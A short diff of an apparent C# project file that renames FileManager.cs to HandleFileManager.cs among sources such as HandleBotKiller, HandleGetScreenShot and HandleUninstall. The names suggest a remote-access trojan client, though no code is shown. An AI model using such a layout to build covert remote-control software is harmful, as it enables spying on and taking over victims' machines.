@@ -74,7 +74,7 @@
   <ItemGroup>
     <Compile Include="Cryptography\Aes256.cs" />
     <Compile Include="Handle Packet\HandleBotKiller.cs" />
-    <Compile Include="Handle Packet\FileManager.cs" />
+    <Compile Include="Handle Packet\HandleFileManager.cs" />
     <Compile Include="Handle Packet\HandleGetScreenShot.cs" />
     <Compile Include="Handle Packet\HandleUninstall.cs" />
     <Compile Include="Handle Packet\Packet.cs" />
